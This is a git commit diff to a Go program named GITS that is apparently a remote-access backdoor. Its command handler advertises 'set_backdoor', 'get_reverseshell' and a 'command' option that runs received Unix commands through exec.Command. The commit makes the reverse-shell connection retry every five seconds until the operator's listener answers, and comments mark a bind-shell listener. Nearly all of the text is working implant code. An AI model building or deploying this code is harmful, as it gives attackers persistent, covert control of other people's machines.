774430cff84e7c1822631cb9cdb84911da3c1397
Denis-REMACLE <denis.remacle@outlook.fr>
2022-10-19 11:01:18 +0200

    Added connection error handling

--- GITS/gits.go
+++ GITS/gits.go
@@ -5,6 +5,7 @@ import (
 	"os/exec"
 	"fmt"
 	"net"
+	"time"
 	"bufio"
 	"strings"
 	"crypto/rsa"
@@ -30,21 +31,23 @@ func KeyGen() (rsa.PublicKey, rsa.PrivateKey) {
 }
 
 func split(tosplit string, sep rune) []string {
-    var fields []string
+	//string splitting function
 
-    last := 0
-    for i,c := range tosplit {
-        if c == sep {
-            // Found the separator, append a slice
-            fields = append(fields, string(tosplit[last:i]))
-            last = i + 1
-        } 
-    }
+	var fields []string
+	last := 0
+	
+	for i,c := range tosplit {
+        	if c == sep {
+        	// Found the separator, append a slice
+        	fields = append(fields, string(tosplit[last:i]))
+        	last = i + 1
+		}
+	}
 
-    // Don't forget the last field
-    fields = append(fields, string(tosplit[last:]))
+	// Don't forget the last field
+	fields = append(fields, string(tosplit[last:]))
 
-    return fields
+	return fields
 }
 
 func Encryption(message string, distant_pub_key rsa.PublicKey) string {
@@ -74,21 +77,19 @@ func Decryption(message string, local_priv_key rsa.PrivateKey) string {
 }
 
 func InterpretCommand(command string) string {
+	//Command interpretation very basic stuff here
 	command = strings.Trim(command, "\n")
 	fields := split(command, ' ')
-	if len(fields) == 1 {
+	if fields[0] == "help" {
 		return "Commands you can use are : help, set_backdoor <IP:PORT>, command <UNIX_COMMAND>, get_reverseshell <IP:PORT>"
 	} else if fields[0] == "command" {
 		payload := strings.TrimLeft(command, "command ")
 		fmt.Println(payload)
 		output_byte, _ := exec.Command(payload).Output()
-		//if err != nil {
-		//	return "Request failed"
-		//}
 		output := fmt.Sprintf("%s", output_byte)
 		return output
 	} else {
-		return "fuck"
+		return "Unknown command try help"
 	}
 }
 
@@ -98,7 +99,7 @@ func EncryptedConnectionHandler(connection net.Conn, local_pub_key rsa.PublicKey
 
 	//We use gob encoding in order to transmit and receive data safely
 	enc := gob.NewEncoder(connection)
-    dec := gob.NewDecoder(connection)
+	dec := gob.NewDecoder(connection)
 
 	if connect == true {
 		var distant_pub_key = rsa.PublicKey{}
@@ -135,10 +136,15 @@ func NormalConnectionHandler(connection net.Conn) {
 }
 
 func Connect(ip_port string, encrypted bool) {
-	connection, err := net.Dial("tcp", ip_port)
-	if err != nil {
-		fmt.Printf("Could not connect: %s\n", err)
-		os.Exit(1)
+	//Connection for reverse shell
+	var connection net.Conn
+	var err error
+	for {
+		connection, err = net.Dial("tcp", ip_port)
+		if err == nil {
+			break
+		}
+		time.Sleep(5 * time.Second)
 	}
 	
 	if encrypted == true {
@@ -150,6 +156,7 @@ func Connect(ip_port string, encrypted bool) {
 }
 
 func Listen(ip_port string, encrypted bool) {
+	//Listen for bind shell
 	listener, err := net.Listen("tcp", ip_port)
 	if err != nil {
 		fmt.Printf("Could not start listener: %s\n", err)
